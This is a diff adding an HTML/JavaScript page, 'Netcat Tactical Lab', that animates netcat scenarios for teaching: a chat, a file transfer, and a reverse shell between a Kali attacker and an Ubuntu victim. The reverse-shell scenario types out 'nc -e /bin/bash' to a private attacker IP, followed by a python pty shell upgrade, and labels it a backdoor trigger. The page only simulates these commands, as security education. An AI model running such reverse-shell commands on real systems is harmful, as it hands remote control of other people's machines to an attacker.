@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netcat Tactical Lab | V3 Ultimate</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        /* =========================================
+           1. CORE AESTHETICS & RESET
+           風格：Titanium Industrial (高對比、金屬質感、數據流)
+           ========================================= */
+        :root {
+            --bg-dark: #0a0a0a;
+            --panel-bg: #111111;
+            --border-color: #333;
+            --kali-red: #ff4444;
+            --kali-bg: rgba(255, 68, 68, 0.05);
+            --target-green: #00ff00;
+            --target-bg: rgba(0, 255, 0, 0.05);
+            --cyan-accent: #00f3ff;
+            --text-main: #d0d0d0;
+            --text-dim: #777;
+            --font-mono: 'Consolas', 'Monaco', 'Courier New', monospace;
+            --font-ui: 'Segoe UI', system-ui, sans-serif;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: var(--font-ui);
+            line-height: 1.6;
+            overflow-x: hidden;
+            background-image: 
+                linear-gradient(rgba(10, 10, 10, 0.97), rgba(10, 10, 10, 0.97)),
+                url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23222' fill-opacity='0.4'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        /* 頂部導航條 */
+        .top-bar {
+            height: 60px; border-bottom: 1px solid var(--border-color);
+            display: flex; align-items: center; padding: 0 30px;
+            background: rgba(17, 17, 17, 0.9); backdrop-filter: blur(10px);
+            position: sticky; top: 0; z-index: 1000;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+        }
+        .brand { font-family: var(--font-mono); font-weight: 700; font-size: 1.2rem; color: #fff; letter-spacing: 2px; }
+        .brand i { color: var(--cyan-accent); margin-right: 10px; }
+
+        /* 主容器 */
+        .main-container {
+            max-width: 1800px; margin: 30px auto; padding: 0 20px;
+            height: calc(100vh - 100px); /* 填滿螢幕高度 */
+            display: flex; flex-direction: column;
+        }
+
+        /* =========================================
+           2. THREE-COLUMN GRID SYSTEM
+           ========================================= */
+        .tactical-grid {
+            display: grid;
+            grid-template-columns: 240px 1fr 350px; /* 左控 | 中演 | 右解 */
+            gap: 20px;
+            flex: 1;
+            min-height: 0; /* 防止 Grid 溢出 */
+        }
+
+        /* 通用面板樣式 */
+        .panel {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            display: flex; flex-direction: column;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        .panel-header {
+            padding: 12px 15px; background: #1a1a1a; border-bottom: 1px solid var(--border-color);
+            font-size: 0.85rem; font-weight: bold; letter-spacing: 1px; color: #aaa;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .panel-header i { margin-right: 8px; color: var(--cyan-accent); }
+
+        /* --- LEFT: CONTROL PANEL --- */
+        .control-list { padding: 15px; display: flex; flex-direction: column; gap: 12px; }
+        
+        .scenario-btn {
+            background: linear-gradient(90deg, #1f1f1f, #181818);
+            border: 1px solid #333; color: #bbb;
+            padding: 15px; cursor: pointer; text-align: left;
+            border-radius: 2px; transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            position: relative; overflow: hidden;
+        }
+        .scenario-btn:hover { border-color: #666; color: #fff; transform: translateX(5px); }
+        .scenario-btn.active {
+            border-color: var(--cyan-accent); color: #fff;
+            background: linear-gradient(90deg, rgba(0, 243, 255, 0.1), transparent);
+            box-shadow: 0 0 15px rgba(0, 243, 255, 0.1);
+        }
+        .scenario-btn.active::before {
+            content: ''; position: absolute; left: 0; top: 0; bottom: 0; width: 4px; background: var(--cyan-accent);
+        }
+        .scenario-btn h3 { font-size: 1rem; margin-bottom: 4px; font-weight: 600; }
+        .scenario-btn p { font-size: 0.75rem; color: #666; margin: 0; }
+        
+        .btn-danger { border-left: 4px solid var(--kali-red) !important; }
+
+        .reset-btn {
+            margin-top: auto; padding: 12px; background: transparent; 
+            border: 1px solid #444; color: #666; cursor: pointer;
+            font-family: var(--font-mono); transition: 0.3s;
+            text-transform: uppercase; font-size: 0.8rem;
+        }
+        .reset-btn:hover { border-color: var(--kali-red); color: var(--kali-red); background: rgba(255, 68, 68, 0.05); }
+
+        /* --- CENTER: SIMULATION STAGE --- */
+        .stage-container {
+            display: flex; flex-direction: column; flex: 1; position: relative;
+            background: #000;
+        }
+
+        /* 終端機外殼 */
+        .terminal-shell {
+            flex: 1; padding: 15px; overflow-y: auto;
+            font-family: var(--font-mono); font-size: 0.95rem;
+            position: relative;
+            scrollbar-width: thin; scrollbar-color: #333 #111;
+        }
+        
+        /* 攻擊者 (上) */
+        #term-kali { 
+            border-bottom: 1px solid var(--border-color); 
+            background: linear-gradient(180deg, rgba(20,0,0,0.3) 0%, rgba(0,0,0,0) 100%);
+        }
+        /* 受害者 (下) */
+        #term-target { 
+            background: linear-gradient(0deg, rgba(0,20,0,0.3) 0%, rgba(0,0,0,0) 100%);
+        }
+
+        /* 終端機內容 */
+        .line { margin-bottom: 4px; word-break: break-all; display: flex; }
+        .prompt-kali { color: var(--kali-red); font-weight: bold; margin-right: 8px; flex-shrink: 0; }
+        .prompt-target { color: var(--target-green); font-weight: bold; margin-right: 8px; flex-shrink: 0; }
+        .cursor { display: inline-block; width: 8px; height: 1.2em; background: #fff; animation: blink 1s step-end infinite; }
+        .cmd-text { color: #fff; }
+        .output-text { color: #ccc; white-space: pre-wrap; }
+
+        /* 中間連接管線 (Data Pipeline) */
+        .pipeline-wrapper {
+            height: 40px; background: #080808;
+            border-top: 1px solid #333; border-bottom: 1px solid #333;
+            display: flex; align-items: center; justify-content: center;
+            position: relative; overflow: hidden;
+            box-shadow: inset 0 0 10px #000;
+        }
+        
+        .pipeline-track {
+            position: absolute; width: 100%; height: 2px; background: #222;
+        }
+        
+        .packet {
+            width: 40px; height: 6px; background: var(--cyan-accent);
+            border-radius: 3px; position: absolute; left: -50px;
+            box-shadow: 0 0 10px var(--cyan-accent);
+            opacity: 0;
+        }
+        
+        .connection-badge {
+            z-index: 10; padding: 4px 12px; border-radius: 12px;
+            font-size: 0.7rem; font-weight: bold; letter-spacing: 1px;
+            background: #111; border: 1px solid #444; color: #555;
+            transition: 0.3s; display: flex; align-items: center; gap: 6px;
+        }
+        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #333; }
+        
+        /* 連線成功狀態 */
+        .connected .connection-badge { border-color: var(--target-green); color: var(--target-green); box-shadow: 0 0 15px rgba(0,255,0,0.2); }
+        .connected .status-dot { background: var(--target-green); box-shadow: 0 0 8px var(--target-green); }
+
+        /* --- RIGHT: ANALYSIS PANEL --- */
+        .analysis-feed {
+            flex: 1; padding: 15px; overflow-y: auto;
+            background: rgba(0,0,0,0.2);
+            display: flex; flex-direction: column; gap: 15px;
+        }
+
+        .analysis-card {
+            background: #1e1e1e; border-left: 3px solid var(--cyan-accent);
+            padding: 12px; border-radius: 0 4px 4px 0;
+            animation: slideIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+        }
+        .card-header { font-size: 0.85rem; color: var(--cyan-accent); font-weight: bold; margin-bottom: 5px; display: flex; justify-content: space-between;}
+        .card-cmd { 
+            background: #000; color: #ddd; padding: 6px; font-family: var(--font-mono); 
+            font-size: 0.8rem; border-radius: 3px; margin: 6px 0; border: 1px solid #333;
+        }
+        .card-desc { font-size: 0.85rem; color: #999; line-height: 1.4; }
+
+        .card-alert { border-left-color: var(--kali-red); }
+        .card-alert .card-header { color: var(--kali-red); }
+
+        /* 動畫 Keyframes */
+        @keyframes blink { 50% { opacity: 0; } }
+        @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
+        @keyframes flowRight { 0% { left: 0%; opacity: 1; } 100% { left: 100%; opacity: 0; } }
+        @keyframes flowLeft { 0% { left: 100%; opacity: 1; } 100% { left: 0%; opacity: 0; } }
+        @keyframes crt-scan { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+
+        /* CRT 掃描線特效 (Overlay) */
+        .crt-overlay {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.1) 50%);
+            background-size: 100% 4px; pointer-events: none; z-index: 99; opacity: 0.3;
+        }
+
+        /* RWD 響應式調整 */
+        @media (max-width: 1200px) {
+            .tactical-grid { grid-template-columns: 200px 1fr; grid-template-rows: 1fr 300px; height: auto; }
+            .panel:nth-child(3) { grid-column: 1 / -1; } /* 解析面板移到底部 */
+        }
+        @media (max-width: 800px) {
+            .tactical-grid { grid-template-columns: 1fr; grid-template-rows: auto 500px auto; }
+            .main-container { height: auto; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="top-bar">
+        <div class="brand"><i class="fas fa-network-wired"></i>NETCAT <span style="color:#666;">TACTICAL</span></div>
+    </div>
+
+    <div class="main-container">
+        
+        <div class="tactical-grid">
+            
+            <div class="panel">
+                <div class="panel-header"><i class="fas fa-sliders-h"></i> OPERATIONS</div>
+                <div class="control-list">
+                    <div class="scenario-btn" id="btn-chat" onclick="initScenario('chat')">
+                        <h3><i class="far fa-comments"></i> 聊天室模式</h3>
+                        <p>Basic TCP Chat / Port Listening</p>
+                    </div>
+                    <div class="scenario-btn" id="btn-file" onclick="initScenario('file')">
+                        <h3><i class="far fa-file-code"></i> 檔案導管</h3>
+                        <p>I/O Redirection & Transfer</p>
+                    </div>
+                    <div class="scenario-btn btn-danger" id="btn-shell" onclick="initScenario('shell')">
+                        <h3><i class="fas fa-biohazard"></i> 反彈 Shell</h3>
+                        <p>Reverse Shell / Remote Control</p>
+                    </div>
+
+                    <button class="reset-btn" onclick="resetSystem()">
+                        <i class="fas fa-redo"></i> Reset Environment
+                    </button>
+                </div>
+                
+                <div style="margin-top:auto; padding:15px; border-top:1px solid #333; font-size:0.75rem; color:#555;">
+                    <div>SYS_STATUS: <span style="color:#0f0">ONLINE</span></div>
+                    <div>KERNEL: 6.5.0-kali3</div>
+                    <div>UPTIME: 04:20:00</div>
+                </div>
+            </div>
+
+            <div class="panel" id="stage-panel">
+                <div class="crt-overlay"></div> <div class="panel-header">
+                    <span><i class="fas fa-terminal"></i> LIVE ENVIRONMENT</span>
+                    <span style="font-size:0.7rem; color:#555;">TCP/IP STACK LOADED</span>
+                </div>
+
+                <div class="stage-container">
+                    <div class="terminal-shell" id="term-kali">
+                        <div class="line">Kali GNU/Linux Rolling</div>
+                        <div class="line" id="kali-active-line">
+                            <span class="prompt-kali">root@kali:~#</span>
+                            <span class="cursor"></span>
+                        </div>
+                    </div>
+
+                    <div class="pipeline-wrapper">
+                        <div class="pipeline-track"></div>
+                        <div class="packet" id="packet-anim"></div>
+                        <div class="connection-badge" id="conn-badge">
+                            <div class="status-dot"></div>
+                            <span id="conn-text">NO CONNECTION</span>
+                        </div>
+                    </div>
+
+                    <div class="terminal-shell" id="term-target">
+                        <div class="line">Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-91-generic x86_64)</div>
+                        <div class="line" id="target-active-line">
+                            <span class="prompt-target">admin@target:~$</span>
+                            <span class="cursor"></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="panel">
+                <div class="panel-header">
+                    <span><i class="fas fa-microscope"></i> PROTOCOL ANALYZER</span>
+                </div>
+                <div class="analysis-feed" id="analysis-feed">
+                    <div style="text-align:center; color:#444; margin-top:50%; transform:translateY(-50%);">
+                        <i class="fas fa-crosshairs fa-3x" style="margin-bottom:15px; opacity:0.3;"></i><br>
+                        WAITING FOR OPERATION...
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <script>
+        // DOM 緩存
+        const els = {
+            kali: document.getElementById('term-kali'),
+            target: document.getElementById('term-target'),
+            kaliLine: document.getElementById('kali-active-line'),
+            targetLine: document.getElementById('target-active-line'),
+            connBadge: document.getElementById('conn-badge'),
+            connText: document.getElementById('conn-text'),
+            packet: document.getElementById('packet-anim'),
+            analysis: document.getElementById('analysis-feed'),
+            stage: document.getElementById('stage-panel'),
+            btns: document.querySelectorAll('.scenario-btn')
+        };
+
+        let isRunning = false;
+        
+        // 常數設定
+        const PROMPT_KALI = '<span class="prompt-kali">root@kali:~#</span>';
+        const PROMPT_TARGET = '<span class="prompt-target">admin@target:~$</span>';
+        
+        // 系統工具函數 (Utility)
+        const wait = (ms) => new Promise(r => setTimeout(r, ms));
+        
+        function clearActiveCursors() {
+            document.querySelectorAll('.cursor').forEach(c => c.style.display = 'none');
+        }
+
+        function createLine(parent, promptHtml, text = '') {
+            clearActiveCursors();
+            const div = document.createElement('div');
+            div.className = 'line';
+            div.innerHTML = `${promptHtml}<span class="cmd-text">${text}</span><span class="cursor"></span>`;
+            parent.appendChild(div);
+            parent.scrollTop = parent.scrollHeight;
+            return div; // 返回這個新的行元素
+        }
+
+        function appendOutput(parent, text, color = '#ccc') {
+            const div = document.createElement('div');
+            div.className = 'output-text';
+            div.textContent = text;
+            div.style.color = color;
+            parent.appendChild(div);
+            parent.scrollTop = parent.scrollHeight;
+        }
+
+        // 打字機效果核心 (支援動態插入)
+        async function typeWriter(container, text, promptHtml, speed = 30) {
+            // 1. 建立新行
+            clearActiveCursors();
+            const lineDiv = document.createElement('div');
+            lineDiv.className = 'line';
+            // 初始狀態
+            lineDiv.innerHTML = `${promptHtml}<span class="cmd-text"></span><span class="cursor"></span>`;
+            container.appendChild(lineDiv);
+            
+            const textSpan = lineDiv.querySelector('.cmd-text');
+            
+            // 2. 逐字輸入
+            for (let i = 0; i < text.length; i++) {
+                textSpan.textContent += text.charAt(i);
+                container.scrollTop = container.scrollHeight;
+                await wait(speed + Math.random() * 20); // 真實打字浮動延遲
+            }
+            
+            await wait(300); // 停頓一下模擬按下 Enter
+            
+            // 3. 移除光標 (若需要) - 但通常保留最後一個光標直到有新輸出
+            return lineDiv; 
+        }
+
+        // 解析卡片生成器
+        function addAnalysis(title, cmd, desc, isAlert = false) {
+            // 清除初始 placeholder
+            if(els.analysis.innerHTML.includes('WAITING FOR')) els.analysis.innerHTML = '';
+
+            const card = document.createElement('div');
+            card.className = `analysis-card ${isAlert ? 'card-alert' : ''}`;
+            card.innerHTML = `
+                <div class="card-header">
+                    <span>${title}</span>
+                    <i class="fas ${isAlert ? 'fa-exclamation-triangle' : 'fa-info-circle'}"></i>
+                </div>
+                ${cmd ? `<div class="card-cmd">${cmd}</div>` : ''}
+                <div class="card-desc">${desc}</div>
+            `;
+            els.analysis.appendChild(card);
+            els.analysis.scrollTop = els.analysis.scrollHeight;
+        }
+
+        // 狀態切換
+        function setConnection(active) {
+            if (active) {
+                els.stage.classList.add('connected');
+                els.connText.textContent = "ESTABLISHED (TCP)";
+            } else {
+                els.stage.classList.remove('connected');
+                els.connText.textContent = "DISCONNECTED";
+            }
+        }
+
+        function sendPacket(direction = 'down') {
+            // 簡單的動畫觸發
+            els.packet.style.animation = 'none';
+            els.packet.offsetHeight; /* trigger reflow */
+            if(direction === 'down') {
+                els.packet.style.animation = 'flowRight 1s linear'; // 這裡偷懶用 Left-Right 代表 Top-Bottom (CSS 中要調整)
+                // 在 CSS 中 flowRight 是 left 0->100。
+                // 為了直觀，我們其實不需要太精確的方向，只要有動就好。
+                // 這裡其實是水平的管線設計，所以 flowRight 是從左(Kali) 到 右(Target)? 
+                // 不對，UI是上下佈局。
+                // 修正 CSS： packet 需要改成 flowDown / flowUp.
+                // 但目前的 CSS .pipeline-wrapper 是水平長條(flex row)。
+                // 概念上：左邊是 Kali 訊號源，右邊是 Target 訊號源? 
+                // 為了簡化，管線是橫的，代表「網路層」。
+                els.packet.style.animation = 'flowRight 0.8s ease-in-out';
+            }
+        }
+
+        // =========================================
+        // SCENARIO LOGIC
+        // =========================================
+
+        async function initScenario(type) {
+            if(isRunning) return;
+            resetSystem();
+            isRunning = true;
+
+            // Highlight button
+            els.btns.forEach(b => b.classList.remove('active'));
+            document.getElementById(`btn-${type}`).classList.add('active');
+
+            if(type === 'chat') await runChat();
+            if(type === 'file') await runFile();
+            if(type === 'shell') await runShell();
+
+            isRunning = false;
+        }
+
+        // --- Scenario 1: Chat ---
+        async function runChat() {
+            // Step 1: Kali Listen
+            addAnalysis("Step 1: 監聽端口", "nc -lvp 4444", "攻擊者 (Server) 開啟 4444 端口，進入監聽模式 (-l)。");
+            await typeWriter(els.kali, "nc -lvp 4444", PROMPT_KALI);
+            appendOutput(els.kali, "listening on [any] 4444 ...");
+            
+            await wait(1000);
+
+            // Step 2: Target Connect
+            addAnalysis("Step 2: 建立連線", "nc 192.168.1.10 4444", "受害者 (Client) 主動連接攻擊者的 IP 與端口。");
+            await typeWriter(els.target, "nc 192.168.1.10 4444", PROMPT_TARGET);
+            
+            setConnection(true);
+            appendOutput(els.kali, "connect to [192.168.1.10] from (UNKNOWN) [192.168.1.50] 48212");
+
+            // Step 3: Chat
+            await wait(800);
+            addAnalysis("Step 3: 數據傳輸", "Raw Data Stream", "TCP 通道建立後，輸入的任何字元都會直接傳送到另一端。");
+            
+            // Kali types
+            await typeWriter(els.kali, "Hello Target, can you see this?", "", 50); // No prompt inside chat
+            sendPacket();
+            await wait(600);
+            appendOutput(els.target, "Hello Target, can you see this?", "#fff");
+
+            await wait(800);
+            // Target replies
+            await typeWriter(els.target, "Yes, loud and clear.", "", 50);
+            sendPacket(); // packet animation needs update for reverse, but visual abstraction is fine
+            await wait(600);
+            appendOutput(els.kali, "Yes, loud and clear.", "#fff");
+        }
+
+        // --- Scenario 2: File Transfer ---
+        async function runFile() {
+            // Step 1: Target Prepares
+            addAnalysis("Step 1: 準備接收", "nc -lvp 4444 > secret.txt", "接收端使用 '>' 重導向符號，將網路流寫入檔案。");
+            await typeWriter(els.target, "nc -lvp 4444 > secret.txt", PROMPT_TARGET);
+            appendOutput(els.target, "listening on [any] 4444 ...");
+
+            await wait(1000);
+
+            // Step 2: Kali Sends
+            addAnalysis("Step 2: 發送檔案", "nc 192.168.1.50 4444 < payload.exe", "發送端使用 '<' 將檔案內容讀入 Netcat 並推送到網路。");
+            await typeWriter(els.kali, "nc 192.168.1.50 4444 < payload.exe", PROMPT_KALI);
+            
+            setConnection(true);
+            appendOutput(els.target, "connect to [192.168.1.50] from (UNKNOWN) [192.168.1.10] 33221");
+            
+            // Visualizing massive data flow
+            els.connText.textContent = "TRANSFERRING DATA...";
+            els.connText.style.color = "#ffcc00";
+            
+            for(let i=0; i<3; i++) {
+                sendPacket();
+                await wait(600);
+            }
+
+            await wait(500);
+            setConnection(false);
+            
+            addAnalysis("Step 3: 傳輸完成", "EOF (End of File)", "當檔案讀取完畢，連線自動關閉。");
+            createLine(els.kali, PROMPT_KALI, ""); // Return to prompt
+            createLine(els.target, PROMPT_TARGET, ""); // Return to prompt
+            appendOutput(els.target, "[File received: 24MB]");
+        }
+
+        // --- Scenario 3: Reverse Shell (The Masterpiece) ---
+        async function runShell() {
+            // 1. Listen
+            addAnalysis("Step 1: 設置控制端", "nc -lvp 4444", "攻擊者等待受害者上鉤。");
+            await typeWriter(els.kali, "nc -lvp 4444", PROMPT_KALI);
+            appendOutput(els.kali, "listening on [any] 4444 ...");
+
+            await wait(1500);
+
+            // 2. Execute Payload
+            addAnalysis("Step 2: 觸發後門", "nc -e /bin/bash ...", "受害者執行帶有 '-e' 參數的指令，將 Shell 綁定到連線。", true);
+            await typeWriter(els.target, "nc -e /bin/bash 192.168.1.10 4444", PROMPT_TARGET);
+            
+            setConnection(true);
+            
+            // 3. Connection Established logic
+            appendOutput(els.kali, "connect to [192.168.1.10] from (UNKNOWN) [192.168.1.50] 55667");
+            
+            // 4. The "Magic" Switch (Visualizing Control)
+            await wait(1000);
+            addAnalysis("Step 3: 取得控制權", "Remote Shell Access", "注意攻擊者視窗！現在輸入的指令是在受害者電腦上執行的。", true);
+            
+            // 這裡是關鍵：在 Kali 的視窗，顯示 Target 的 Prompt
+            // 我們不使用 PROMPT_KALI，而是手動構建
+            
+            // First command: whoami
+            // 注意：這裡我們模擬在 Kali 打字，但 Prompt 已經看不見了? 
+            // 不，通常 Reverse Shell 連上後，沒有 Prompt，直到你用 python spawn pty。
+            // 為了教學直觀，我們模擬它直接顯示了基本的 response，或者直接打字
+            
+            // 模擬輸入 'whoami' (沒有 prompt 或是簡單的 prompt)
+            // 真實情況通常是一片黑，打 ls 才有反應。但這裡我們讓它顯示簡單的 shell 符號
+            
+            // 模擬輸入
+            clearActiveCursors();
+            const cmdLine = document.createElement('div');
+            cmdLine.className = 'line';
+            cmdLine.innerHTML = `<span class="cmd-text"></span><span class="cursor"></span>`; // No prompt visually first
+            els.kali.appendChild(cmdLine);
+            
+            const span = cmdLine.querySelector('.cmd-text');
+            const txt = "whoami";
+            for(let c of txt) { span.textContent += c; await wait(50); }
+            await wait(200);
+            
+            // Output
+            appendOutput(els.kali, "root"); // Show result
+            
+            await wait(800);
+            
+            // Next command: hostname
+            clearActiveCursors();
+            const cmdLine2 = document.createElement('div');
+            cmdLine2.className = 'line';
+            cmdLine2.innerHTML = `<span class="cmd-text"></span><span class="cursor"></span>`;
+            els.kali.appendChild(cmdLine2);
+            
+            const span2 = cmdLine2.querySelector('.cmd-text');
+            const txt2 = "hostname";
+            for(let c of txt2) { span2.textContent += c; await wait(50); }
+            await wait(200);
+            
+            appendOutput(els.kali, "target-server-prod");
+
+            // Final step: Upgrade Shell (Visual payoff)
+            await wait(800);
+            addAnalysis("Step 4: 權限確認", "root@target", "確認身分：我們現在是 Target 的 Root 使用者。");
+            
+            // 模擬 Python PTY spawn (讓 prompt 出現)
+            // 只顯示結果，讓視覺衝擊最大化
+            appendOutput(els.kali, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", "#555");
+            await wait(500);
+            
+            // BOOM: The Target Prompt appears inside Kali Terminal
+            createLine(els.kali, PROMPT_TARGET, ""); 
+            
+            // Target terminal dimmed out implies lost control
+            els.target.style.opacity = "0.5";
+            els.target.style.filter = "grayscale(1)";
+        }
+
+        // Reset
+        function resetSystem() {
+            // Stop animations
+            setConnection(false);
+            
+            // Clear contents
+            els.kali.innerHTML = '';
+            els.target.innerHTML = '';
+            els.analysis.innerHTML = `
+                <div style="text-align:center; color:#444; margin-top:50%; transform:translateY(-50%);">
+                    <i class="fas fa-crosshairs fa-3x" style="margin-bottom:15px; opacity:0.3;"></i><br>
+                    WAITING FOR OPERATION...
+                </div>
+            `;
+            
+            // Restore Initial State
+            const kLine = document.createElement('div');
+            kLine.className = 'line';
+            kLine.innerHTML = `${PROMPT_KALI}<span class="cursor"></span>`;
+            els.kali.appendChild(kLine);
+            
+            const tLine = document.createElement('div');
+            tLine.className = 'line';
+            tLine.innerHTML = `${PROMPT_TARGET}<span class="cursor"></span>`;
+            els.target.appendChild(tLine);
+            
+            // Reset styles
+            els.target.style.opacity = "1";
+            els.target.style.filter = "none";
+            
+            // Reset buttons
+            els.btns.forEach(b => b.classList.remove('active'));
+        }
+
+    </script>
+</body>
+</html>
